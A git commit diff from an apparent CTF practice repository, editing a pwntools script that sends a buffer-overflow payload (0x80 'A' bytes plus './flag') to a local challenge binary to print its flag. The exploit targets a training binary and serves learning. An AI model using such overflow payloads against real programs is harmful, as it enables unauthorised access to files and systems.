6e4c0873312eed6d1516f0acad38c1ec934b9446
JinnyLyn <noh8829@protonmail.com>
2025-02-20 10:57:21 +0900

    dd
    d

--- j진서/CTFnWARGAMES/DH/2_pwnable/bof/deploy/ex.py
+++ j진서/CTFnWARGAMES/DH/2_pwnable/bof/deploy/ex.py
@@ -5,7 +5,8 @@ def main(bin):
     p = process(bin)
     payload = b'A'*0x80 + b'./flag'
     p.sendlineafter(b'meow? ', payload)
-    print(p.recvall().decode())
+    flag = p.recvuntil(b'}')
+    print(f'FLAG: {flag.decode()}')
 
 if __name__ == "__main__":
     bin = './bof'
